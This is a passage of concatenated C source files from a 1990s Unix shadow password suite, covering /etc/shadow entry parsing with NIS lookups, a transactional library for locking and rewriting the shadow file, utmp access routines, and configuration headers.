			spwd.sp_max = -1;
#else
		return 0;
#endif
	} else if (fields[4][0] == '\0')
		spwd.sp_max = -1;

	/*
	 * If there are only OFIELDS fields (this is a SVR3.2 /etc/shadow
	 * formatted file), initialize the other field members to -1.
	 */

#ifdef	SVR4
	if (i == OFIELDS)
		return 0;
#else
	if (i == OFIELDS) {
		spwd.sp_warn = spwd.sp_inact = spwd.sp_expire =
			spwd.sp_flag = -1;

		return &spwd;
	}
#endif

	/*
	 * The rest of the fields are mandatory for SVR4, but optional
	 * for anything else.  However, if one is present the others
	 * must be as well.
	 */

	/*
	 * Get the number of days of password expiry warning.
	 */

	if ((spwd.sp_warn = strtol (fields[5], &cpp, 10)) == 0 && *cpp) {
#ifdef	USE_NIS
		if (! nis_used)
			return 0;
		else
			spwd.sp_warn = -1;
#else
		return 0;
#endif
	} else if (fields[5][0] == '\0')
		spwd.sp_warn = -1;

	/*
	 * Get the number of days of inactivity before an account is
	 * disabled.
	 */

	if ((spwd.sp_inact = strtol (fields[6], &cpp, 10)) == 0 && *cpp) {
#ifdef	USE_NIS
		if (! nis_used)
			return 0;
		else
			spwd.sp_inact = -1;
#else
		return 0;
#endif
	} else if (fields[6][0] == '\0')
		spwd.sp_inact = -1;

	/*
	 * Get the number of days after the epoch before the account is
	 * set to expire.
	 */

	if ((spwd.sp_expire = strtol (fields[7], &cpp, 10)) == 0 && *cpp) {
#ifdef	USE_NIS
		if (! nis_used)
			return 0;
		else
			spwd.sp_expire = -1;
#else
		return 0;
#endif
	} else if (fields[7][0] == '\0')
		spwd.sp_expire = -1;

	/*
	 * This field is reserved for future use.  But it isn't supposed
	 * to have anything other than a valid integer in it.
	 */

	if ((spwd.sp_flag = strtol (fields[8], &cpp, 10)) == 0 && *cpp) {
#ifdef	USE_NIS
		if (! nis_used)
			return 0;
		else
			spwd.sp_flag = -1;
#else
		return 0;
#endif
	} else if (fields[8][0] == '\0')
		spwd.sp_flag = -1;

	return (&spwd);
}

/*
 * fgetspent - get an entry from a /etc/shadow formatted stream
 */

struct spwd
*fgetspent (fp)
FILE	*fp;
{
	char	buf[BUFSIZ];
	char	*cp;

	if (! fp)
		return (0);

#ifdef	USE_NIS
	while (fgets (buf, sizeof buf, fp) != (char *) 0)
#else
	if (fgets (buf, sizeof buf, fp) != (char *) 0)
#endif
	{
		if ((cp = strchr (buf, '\n')))
			*cp = '\0';
#ifdef	USE_NIS
		if (nis_ignore && IS_NISCHAR (buf[0]))
			continue;
#endif
		return (sgetspent (buf));
	}
	return 0;
}

/*
 * getspent - get a (struct spwd *) from the current shadow file
 */

struct spwd
*getspent ()
{
#ifdef	USE_NIS
	int	nis_1_user = 0;
	struct	spwd	*val;
	char	buf[BUFSIZ];
#endif
	if (! shadow)
		setspent ();

#ifdef	USE_NIS
again:
	/*
	 * See if we are reading from the local file.
	 */

	if (nis_state == native || nis_state == native2) {

		/*
		 * Get the next entry from the shadow file.  Return NULL
		 * right away if there is none.
		 */

		if (! (val = fgetspent (shadow)))
			return 0;

		/*
		 * If this entry began with a NIS escape character, we have
		 * to see if this is just a single user, or if the entire
		 * map is being asked for.
		 */

		if (IS_NISCHAR (val->sp_namp[0])) {
			if (val->sp_namp[1])
				nis_1_user = 1;
			else
				nis_state = start;
		}

		/*
		 * If this isn't a NIS user and this isn't an escape to go
		 * use a NIS map, it must be a regular local user.
		 */

		if (nis_1_user == 0 && nis_state != start)
			return val;

		/*
		 * If this is an escape to use an NIS map, switch over to
		 * that bunch of code.
		 */

		if (nis_state == start)
			goto again;

		/*
		 * NEEDSWORK.  Here we substitute pieces-parts of this entry.
		 */

		return 0;
	} else {
		if (nis_bound == 0) {
			if (bind_nis ()) {
				nis_state = native2;
				goto again;
			}
		}
		if (nis_state == start) {
			if (yp_first (nis_domain, "shadow.bynam", &nis_key,
				&nis_keylen, &nis_val, &nis_vallen)) {
				nis_state = native2;
				goto again;
			}
			nis_state = middle;
		} else if (nis_state == middle) {
			if (yp_next (nis_domain, "shadow.bynam", nis_key,
				nis_keylen, &nis_key, &nis_keylen,
				&nis_val, &nis_vallen)) {
				nis_state = native2;
				goto again;
			}
		}
		return sgetspent (nis_val);
	}
#else
	return (fgetspent (shadow));
#endif
}

/*
 * getspnam - get a shadow entry by name
 */

struct spwd *
getspnam (name)
	const char *name;
{
	struct	spwd	*sp;
#ifdef NDBM
	datum	key;
	datum	content;
#endif
#ifdef	USE_NIS
	char	buf[BUFSIZ];
	static	char	save_name[16];
	int	nis_disabled = 0;
#endif

	setspent ();

#ifdef NDBM

	/*
	 * If the DBM file are now open, create a key for this UID and
	 * try to fetch the entry from the database.  A matching record
	 * will be unpacked into a static structure and returned to
	 * the user.
	 */

	if (dbmopened) {
		key.dsize = strlen (name);
		key.dptr = (char *) name;

		content = dbm_fetch (sp_dbm, key);
		if (content.dptr != 0) {
			memcpy (spwbuf, content.dptr, content.dsize);
			spw_unpack (spwbuf, content.dsize, &spwd);
			endspent();
			return &spwd;
		}
	}
#endif
#ifdef	USE_NIS
	/*
	 * Search the shadow.byname map for this user.
	 */

	if (! nis_ignore && ! nis_bound)
		bind_nis ();

	if (! nis_ignore && nis_bound) {
		char	*cp;

		if (yp_match (nis_domain, "shadow.byname", name,
				strlen (name), &nis_val, &nis_vallen) == 0) {

			if (cp = strchr (nis_val, '\n'))
				*cp = '\0';

			nis_state = middle;
			if ((sp = sgetspent (nis_val))) {
				strcpy (save_name, sp->sp_namp);
				nis_key = save_name;
				nis_keylen = strlen (save_name);
			}
			endspent();
			return sp;
		} else
			nis_state = native2;
	}
#endif
#ifdef	USE_NIS
	/*
	 * NEEDSWORK -- this is a mess, and it is the same mess in the
	 * other three files.  I can't just blindly turn off NIS because
	 * this might be the first pass through the local files.  In
	 * that case, I never discover that NIS is present.
	 */

	if (nis_used) {
		nis_ignore++;
		nis_disabled++;
	}
#endif
	while ((sp = getspent ()) != (struct spwd *) 0) {
		if (strcmp (name, sp->sp_namp) == 0)
			break;
	}
#ifdef	USE_NIS
	if (nis_disabled)
		nis_ignore--;
#endif
	endspent();
	return (sp);
}
#endif	/*}*/
/*
 * Copyright 1990 - 1994, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 *
 *	This file implements a transaction oriented password database
 *	library.  The password file is updated one entry at a time.
 *	After each transaction the file must be logically closed and
 *	transferred to the existing password file.  The sequence of
 *	events is
 *
 *	spw_lock			-- lock shadow file
 *	spw_open			-- logically open shadow file
 *	while transaction to process
 *		spw_(locate,update,remove) -- perform transaction
 *	done
 *	spw_close			-- commit transactions
 *	spw_unlock			-- remove shadow lock
 */

#include <config.h>
#ifdef	SHADOWPWD	/*{*/

#include "rcsid.h"
RCSID("$Id: shadowio.c,v 1.1.1.1 1996/08/10 07:59:51 marekm Exp $")

#include "prototypes.h"
#include "defines.h"
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdio.h>
#include <signal.h>

#define NEED_SPW_FILE_ENTRY
#include "shadowio.h"

static	int	islocked;
static	int	isopen;
static	int	open_modes;
static	FILE	*spwfp;

struct	spw_file_entry	*__spwf_head;
static	struct	spw_file_entry	*spwf_tail;
static	struct	spw_file_entry	*spwf_cursor;
int	__sp_changed;
static	int	lock_pid;

#define	SPW_LOCK	"/etc/shadow.lock"
#define	SPW_TEMP	"/etc/spwd.%d"

static	char	spw_filename[BUFSIZ] = SHADOW_FILE;

extern	char	*strdup();
extern	char	*malloc();
extern	struct	spwd	*sgetspent();
extern int do_lock_file();
extern FILE *fopen_with_umask();

/*
 * __spw_dup - duplicate a shadow file entry
 *
 *	__spw_dup() accepts a pointer to a shadow file entry and
 *	returns a pointer to a shadow file entry in allocated
 *	memory.
 */

struct spwd *
__spw_dup(spwd)
	const struct spwd *spwd;
{
	struct	spwd	*spw;

	if (! (spw = (struct spwd *) malloc (sizeof *spw)))
		return 0;

	*spw = *spwd;
	if ((spw->sp_namp = strdup (spwd->sp_namp)) == 0 ||
			(spw->sp_pwdp = strdup (spwd->sp_pwdp)) == 0)
		return 0;

	return spw;
}

/*
 * spw_free - free a dynamically allocated shadow file entry
 *
 *	spw_free() frees up the memory which was allocated for the
 *	pointed to entry.
 */

static void
spw_free(spwd)
	const struct spwd *spwd;
{
	free (spwd->sp_namp);
	free (spwd->sp_pwdp);
}

/*
 * spw_name - change the name of the shadow password file
 */

int
spw_name(name)
	const char *name;
{
	if (isopen || strlen (name) > (BUFSIZ-10))
		return -1;

	strcpy (spw_filename, name);
	return 0;
}

/*
 * spw_lock - lock a password file
 *
 *	spw_lock() encapsulates the lock operation.  it returns
 *	TRUE or FALSE depending on the password file being
 *	properly locked.  the lock is set by creating a semaphore
 *	file, SPW_LOCK.
 */

int
spw_lock()
{
	char	file[BUFSIZ];
	char	lock[BUFSIZ];

	if (islocked)
		return 1;

	lock_pid = getpid();
	if (strcmp (spw_filename, SHADOW_FILE) != 0) {
		sprintf (file, "%s.%d", spw_filename, lock_pid);
		sprintf (lock, "%s.lock", spw_filename);
	} else {
		sprintf (file, SPW_TEMP, lock_pid);
		strcpy (lock, SPW_LOCK);
	}

	/*
	 * The rest is common to all four files (see commonio.c).  --marekm
	 */

	if (do_lock_file(file, lock)) {
		islocked = 1;
		return 1;
	}

	return 0;
}

/*
 * spw_unlock - logically unlock a shadow file
 *
 *	spw_unlock() removes the lock which was set by an earlier
 *	invocation of spw_lock().
 */

int
spw_unlock()
{
	char	lock[BUFSIZ];

	if (isopen) {
		open_modes = O_RDONLY;
		if (! spw_close ())
			return 0;
	}
  	if (islocked) {
  		islocked = 0;
		if (lock_pid != getpid ())
			return 0;

		strcpy (lock, spw_filename);
		strcat (lock, ".lock");
		(void) unlink (lock);
		return 1;
	}
	return 0;
}

/*
 * spw_open - open a password file
 *
 *	spw_open() encapsulates the open operation.  it returns
 *	TRUE or FALSE depending on the shadow file being
 *	properly opened.
 */

int
spw_open(mode)
	int mode;
{
	char	buf[BUFSIZ];
	char	*cp;
	struct	spw_file_entry	*spwf;
	struct	spwd	*spwd;

	if (isopen || (mode != O_RDONLY && mode != O_RDWR))
		return 0;

	if (mode != O_RDONLY && ! islocked &&
			strcmp (spw_filename, SHADOW_FILE) == 0)
		return 0;

	if ((spwfp = fopen (spw_filename, mode == O_RDONLY ? "r":"r+")) == 0)
		return 0;

	__spwf_head = spwf_tail = spwf_cursor = 0;
	__sp_changed = 0;

	while (fgets (buf, sizeof buf, spwfp) != (char *) 0) {
		if ((cp = strrchr (buf, '\n')))
			*cp = '\0';

		if (!(spwf = (struct spw_file_entry *) malloc(sizeof *spwf)))
			goto fail;

		spwf->spwf_changed = 0;
		if (!(spwf->spwf_line = strdup(buf)))
			goto fail;
		if ((spwd = sgetspent(buf)) && !(spwd = __spw_dup (spwd)))
			goto fail;

		spwf->spwf_entry = spwd;

		if (__spwf_head == 0) {
			__spwf_head = spwf_tail = spwf;
			spwf->spwf_next = 0;
		} else {
			spwf_tail->spwf_next = spwf;
			spwf->spwf_next = 0;
			spwf_tail = spwf;
		}
	}
	isopen++;
	open_modes = mode;

	return 1;

fail:
	fclose(spwfp);
	return 0;
}

/*
 * spw_close - close the password file
 *
 *	spw_close() outputs any modified password file entries and
 *	frees any allocated memory.
 */

int
spw_close()
{
	char	backup[BUFSIZ];
	char	newfile[BUFSIZ];
	int	errors = 0;
	struct	spw_file_entry *spwf;
	struct	stat	sb;

	if (! isopen) {
		errno = EINVAL;
		return 0;
	}
	if (islocked && lock_pid != getpid ()) {
		isopen = 0;
		islocked = 0;
		errno = EACCES;
		return 0;
	}
	strcpy (backup, spw_filename);
	strcat (backup, "-");
	strcpy (newfile, spw_filename);
	strcat (newfile, "+");

	/*
	 * Create a backup copy of the shadow password file
	 */

	if (open_modes == O_RDWR && __sp_changed) {

		/*
		 * POLICY: /etc/shadow
		 * Any backup copy of the password file shall have the
		 * same protections as the original.
		 */

		if (fstat (fileno (spwfp), &sb))
			return 0;

		if (create_backup_file(spwfp, backup, &sb))
			return 0;

		isopen = 0;
		(void) fclose (spwfp);

		/*
		 * POLICY: /etc/shadow
		 * The shadow password file shall allow write access to
		 * privileged users only.
		 *
		 * The shadow password file is opened with no access
		 * permissions to any user.  This allows the file to be
		 * changed to root ownership and then made readable by the
		 * owner without ever giving any unprivileged user write
		 * access.
		 */

		spwfp = fopen_with_umask(newfile, "w", 0777);
		if (!spwfp)
			return 0;
		if (chown(newfile, sb.st_uid, sb.st_gid) ||
		    chmod(newfile, sb.st_mode))
			return 0;

		/*
		 * Check each member in the list and write out any elements
		 * that have been changed.
		 */

		for (spwf = __spwf_head;errors == 0 && spwf;
						spwf = spwf->spwf_next) {
			if (spwf->spwf_changed) {
				if (putspent (spwf->spwf_entry, spwfp))
					errors++;
			} else {
				if (fputs (spwf->spwf_line, spwfp) == EOF)
					errors++;
				if (putc ('\n', spwfp) == EOF)
					errors++;
			}
		}
		if (fflush (spwfp))
			errors++;
		if (fclose (spwfp))
			errors++;

		if (errors) {
			unlink (newfile);
			return 0;
		}

		/*
		 * POLICY: /etc/shadow
		 * The shadow password file shall be consistent at all
		 * times.
		 *
		 * The new shadow password file is moved into place only
		 * after determining that the file was created without any
		 * errors occuring.
		 */

		if (rename (newfile, spw_filename))
			return 0;
		sync();
	} else
		/*
		 * Just close the file -- there was nothing to change
		 */

		fclose (spwfp);

	spwfp = 0;

	/*
	 * Free up all of the memory in the linked list.
	 */

	while (__spwf_head != 0) {
		spwf = __spwf_head;
		__spwf_head = spwf->spwf_next;

		if (spwf->spwf_entry) {
			spw_free (spwf->spwf_entry);
			free (spwf->spwf_entry);
		}
		if (spwf->spwf_line)
			free (spwf->spwf_line);

		free (spwf);
	}
	spwf_tail = 0;
	isopen = 0;
	return 1;
}

int
spw_update(spwd)
	const struct spwd *spwd;
{
	struct	spw_file_entry	*spwf;
	struct	spwd	*nspwd;

	if (! isopen || open_modes == O_RDONLY) {
		errno = EINVAL;
		return 0;
	}
	for (spwf = __spwf_head;spwf != 0;spwf = spwf->spwf_next) {
		if (spwf->spwf_entry == 0)
			continue;

		if (strcmp (spwd->sp_namp, spwf->spwf_entry->sp_namp) != 0)
			continue;

		if (! (nspwd = __spw_dup (spwd)))
			return 0;
		else {
			spw_free (spwf->spwf_entry);
			*(spwf->spwf_entry) = *nspwd;
		}
		spwf->spwf_changed = 1;
		spwf_cursor = spwf;
		return __sp_changed = 1;
	}
	spwf = (struct spw_file_entry *) malloc (sizeof *spwf);
	if (!spwf)
		return 0;
	if (! (spwf->spwf_entry = __spw_dup (spwd)))
		return 0;

	spwf->spwf_changed = 1;
	spwf->spwf_next = 0;
	spwf->spwf_line = 0;

	if (spwf_tail)
		spwf_tail->spwf_next = spwf;

	if (! __spwf_head)
		__spwf_head = spwf;

	spwf_tail = spwf;

	return __sp_changed = 1;
}

int
spw_remove(name)
	const char *name;
{
	struct	spw_file_entry	*spwf;
	struct	spw_file_entry	*ospwf;

	if (! isopen || open_modes == O_RDONLY) {
		errno = EINVAL;
		return 0;
	}
	for (ospwf = 0, spwf = __spwf_head;spwf != 0;
			ospwf = spwf, spwf = spwf->spwf_next) {
		if (! spwf->spwf_entry)
			continue;

		if (strcmp (name, spwf->spwf_entry->sp_namp) != 0)
			continue;

		if (spwf == spwf_cursor)
			spwf_cursor = ospwf;

		if (ospwf != 0)
			ospwf->spwf_next = spwf->spwf_next;
		else
			__spwf_head = spwf->spwf_next;

		if (spwf == spwf_tail)
			spwf_tail = ospwf;

		return __sp_changed = 1;
	}
	errno = ENOENT;
	return 0;
}

const struct spwd *
spw_locate(name)
	const char *name;
{
	struct	spw_file_entry	*spwf;

	if (! isopen) {
		errno = EINVAL;
		return 0;
	}
	for (spwf = __spwf_head;spwf != 0;spwf = spwf->spwf_next) {
		if (spwf->spwf_entry == 0)
			continue;

		if (strcmp (name, spwf->spwf_entry->sp_namp) == 0) {
			spwf_cursor = spwf;
			return spwf->spwf_entry;
		}
	}
	errno = ENOENT;
	return 0;
}

int
spw_rewind()
{
	if (! isopen) {
		errno = EINVAL;
		return 0;
	}
	spwf_cursor = 0;
	return 1;
}

const struct spwd *
spw_next()
{
	if (! isopen) {
		errno = EINVAL;
		return 0;
	}
	if (spwf_cursor == 0)
		spwf_cursor = __spwf_head;
	else
		spwf_cursor = spwf_cursor->spwf_next;

	while (spwf_cursor) {
		if (spwf_cursor->spwf_entry)
			return spwf_cursor->spwf_entry;

		spwf_cursor = spwf_cursor->spwf_next;
	}
	return 0;
}
#endif	/*}*/
/*
 * Copyright 1993 - 1994, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>

#ifndef	HAVE_GETUTENT

#include "defines.h"
#include <stdio.h>
#include <fcntl.h>
#include <utmp.h>

#ifndef	lint
static char rcsid[] = "$Id: utent.c,v 1.1.1.1 1996/08/10 07:59:51 marekm Exp $";
#endif

static	int	utmp_fd = -1;
static	struct	utmp	utmp_buf;

/*
 * setutent - open or rewind the utmp file
 */

void
setutent ()
{
	if (utmp_fd == -1)
		if ((utmp_fd = open (_UTMP_FILE, O_RDWR)) == -1)
			utmp_fd = open (_UTMP_FILE, O_RDONLY);

	if (utmp_fd != -1)
		lseek (utmp_fd, (off_t) 0L, SEEK_SET);
}

/*
 * endutent - close the utmp file
 */

void
endutent ()
{
	if (utmp_fd != -1)
		close (utmp_fd);

	utmp_fd = -1;
}

/*
 * getutent - get the next record from the utmp file
 */

struct utmp *
getutent ()
{
	if (utmp_fd == -1)
		setutent ();

	if (utmp_fd == -1)
		return 0;

	if (read (utmp_fd, &utmp_buf, sizeof utmp_buf) != sizeof utmp_buf)
		return 0;

	return &utmp_buf;
}

/*
 * getutline - get the utmp entry matching ut_line
 */

struct utmp *
getutline (utent)
	const struct utmp *utent;
{
	struct	utmp	save;
	struct	utmp	*new;

	save = *utent;
	while (new = getutent ())
		if (strncmp (new->ut_line, save.ut_line, sizeof new->ut_line))
			continue;
		else
			return new;

	return (struct utmp *) 0;
}
#endif
/* $Id: defines.h,v 1.3 1996/09/25 03:19:52 marekm Exp $ */
/* some useful defines */

#ifndef _DEFINES_H_
#define _DEFINES_H_

#if STDC_HEADERS
#include <stdlib.h>
#include <string.h>
#else  /* not STDC_HEADERS */
#ifndef HAVE_STRCHR
#define strchr index
#define strrchr rindex
#endif
char *strchr(), *strrchr(), *strtok();
#ifndef HAVE_MEMCPY
#define memcpy(d, s, n) bcopy((s), (d), (n))
#endif
#endif /* not STDC_HEADERS */

#include <sys/types.h>
#if HAVE_SYS_WAIT_H
#include <sys/wait.h>
#endif
#ifndef WEXITSTATUS
#define WEXITSTATUS(stat_val) ((unsigned)(stat_val) >> 8)
#endif
#ifndef WIFEXITED
#define WIFEXITED(stat_val) (((stat_val) & 255) == 0)
#endif

#if HAVE_UNISTD_H
#include <unistd.h>
#endif

#if TIME_WITH_SYS_TIME
#include <sys/time.h>
#include <time.h>
#else  /* not TIME_WITH_SYS_TIME */
#if HAVE_SYS_TIME_H
#include <sys/time.h>
#else
#include <time.h>
#endif
#endif /* not TIME_WITH_SYS_TIME */

#ifndef HAVE_BZERO  /* XXX */
#define bzero(ptr, size) memset((ptr), 0, (size))
#endif

#ifdef HAVE_DIRENT_H  /* DIR_SYSV */
#include <dirent.h>
#define DIRECT dirent
#else
#ifdef HAVE_SYS_NDIR_H  /* DIR_XENIX */
#include <sys/ndir.h>
#endif
#ifdef HAVE_SYS_DIR_H  /* DIR_??? */
#include <sys/dir.h>
#endif
#ifdef HAVE_NDIR_H  /* DIR_BSD */
#include <ndir.h>
#endif
#define DIRECT direct
#endif

#ifdef SHADOWPWD
/*
 * Possible cases:
 * - /usr/include/shadow.h exists and includes the shadow group stuff.
 * - /usr/include/shadow.h exists, but we use our own gshadow.h.
 * - /usr/include/shadow.h doesn't exist, use our own shadow.h and gshadow.h.
 */
#if HAVE_SHADOW_H
#include <shadow.h>
#if defined(SHADOWGRP) && !defined(GSHADOW)
#include "gshadow_.h"
#endif
#else  /* not HAVE_SHADOW_H */
#include "shadow_.h"
#ifdef SHADOWGRP
#include "gshadow_.h"
#endif
#endif  /* not HAVE_SHADOW_H */
#endif  /* SHADOWPWD */

#include <limits.h>

#ifndef	NGROUPS_MAX
#ifdef	NGROUPS
#define	NGROUPS_MAX	NGROUPS
#else
#define	NGROUPS_MAX	64
#endif
#endif

#ifdef USE_SYSLOG
#include <syslog.h>

#ifndef LOG_WARN
#define LOG_WARN LOG_WARNING
#endif

/* cleaner than lots of #ifdefs everywhere - use this as follows:
   SYSLOG((LOG_CRIT, "user %s cracked root", user)); */
#define SYSLOG(x) syslog x

#else
#define SYSLOG(x)  /* empty */
#define openlog(a,b,c)  /* empty */
#define closelog()  /* empty */
#endif

#ifndef F_OK
#define F_OK 0
#define X_OK 1
#define W_OK 2
#define R_OK 4
#endif

#ifndef SEEK_SET
#define SEEK_SET 0
#define SEEK_CUR 1
#define SEEK_END 2
#endif

#if HAVE_TERMIOS_H
#include <termios.h>
#define STTY(fd, termio) tcsetattr(fd, TCSANOW, termio)
#define GTTY(fd, termio) tcgetattr(fd, termio)
#define TERMIO struct termios
#define USE_TERMIOS
#elif HAVE_TERMIO_H
#include <sys/ioctl.h>
#include <termio.h>
#define STTY(fd, termio) ioctl(fd, TCSETA, termio)
#define GTTY(fd, termio) ioctl(fd, TCGETA, termio)
#define TEMRIO struct termio
#define USE_TERMIO
#elif HAVE_SGTTY_H
#include <sgtty.h>
#define STTY(fd, termio) stty(fd, termio)
#define GTTY(fd, termio) gtty(fd, termio)
#define TERMIO struct sgttyb
#define USE_SGTTY
#endif

#ifndef UT_USER  /* some systems have ut_name instead of ut_user */
#define UT_USER ut_user
#endif

/*
 * Password aging constants
 *
 * DAY - seconds / day
 * WEEK - seconds / week
 * SCALE - seconds / aging unit
 */

#define DAY (24L*3600L)
#define WEEK (7*DAY)

#ifdef ITI_AGING
#define SCALE 1
#else
#define SCALE DAY
#endif

#if !defined(MDY_DATE) && !defined(DMY_DATE) && !defined(YMD_DATE)
#define	MDY_DATE	1
#endif
#if (defined (MDY_DATE) && (defined (DMY_DATE) || defined (YMD_DATE))) || \
    (defined (DMY_DATE) && (defined (MDY_DATE) || defined (YMD_DATE)))
Error: You must only define one of MDY_DATE, DMY_DATE, or YMD_DATE
#endif

#ifdef MDY_DATE
#define DATE_FORMAT_DESCR "mm/dd/yy"
#define DATE_FORMAT_STRING "%m/%d/%y"
#endif

#ifdef DMY_DATE
#define DATE_FORMAT_DESCR "dd/mm/yy"
#define DATE_FORMAT_STRING "%d/%m/%y"
#endif

#ifdef YMD_DATE
#define DATE_FORMAT_DESCR "yy/mm/dd"
#define DATE_FORMAT_STRING "%y/%m/%d"
#endif

/* Copy string pointed by B to array A with size checking.  It was originally
   in lmain.c but is _very_ useful elsewhere.  Some setuid root programs with
   very sloppy coding used to assume that BUFSIZ will always be enough...  */

					/* danger - side effects */
#define STRFCPY(A,B) \
	(strncpy((A), (B), sizeof(A) - 1), (A)[sizeof(A) - 1] = '\0')

/* get rid of a few ugly repeated #ifdefs in pwent.c and grent.c */
#if defined(SVR4) || defined(AIX) || defined(LINUX)
#define SETXXENT_TYPE void
#define SETXXENT_RET(x) return
#define SETXXENT_TEST(x) x; if (0) /* compiler should optimize this away */
#else
#define SETXXENT_TYPE int
#define SETXXENT_RET(x) return(x)
#define SETXXENT_TEST(x) if (x)
#endif

#ifndef PASSWD_FILE
#define PASSWD_FILE "/etc/passwd"
#endif

#ifndef GROUP_FILE
#define GROUP_FILE "/etc/group"
#endif

#ifdef SHADOWPWD
#ifndef SHADOW_FILE
#define SHADOW_FILE "/etc/shadow"
#endif
#endif

#ifdef SHADOWGRP
#ifndef SGROUP_FILE
#define SGROUP_FILE "/etc/gshadow"
#endif
#endif

#define PASSWD_PAG_FILE  PASSWD_FILE ".pag"
#define GROUP_PAG_FILE   GROUP_FILE  ".pag"
#define SHADOW_PAG_FILE  SHADOW_FILE ".pag"
#define SGROUP_PAG_FILE  SGROUP_FILE ".pag"

#endif  /* _DEFINES_H_ */
/*
 * Copyright 1989 - 1991, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

/*
 * Structure of the /etc/d_passwd file
 *
 *	The d_passwd file contains the names of login shells which require
 *	dialup passwords.  Each line contains the fully qualified path name
 *	for the shell, followed by an optional password.  Each field is
 *	separated by a ':'.
 *
 * Structure of the /etc/dialups file
 *
 *	The dialups file contains the names of ports which may be dialup
 *	lines.  Each line consists of the last component of the path
 *	name.  The leading "/dev/" string is removed.
 *
 *	$Id: dialup.h,v 1.1.1.1 1996/08/10 07:59:51 marekm Exp $
 */

#ifndef	_DIALUP_H
#define	_DIALUP_H

struct	dialup {
	char	*du_shell;
	char	*du_passwd;
};

extern void setduent P_((void));
extern void endduent P_((void));
extern struct dialup *fgetduent P_((FILE *));
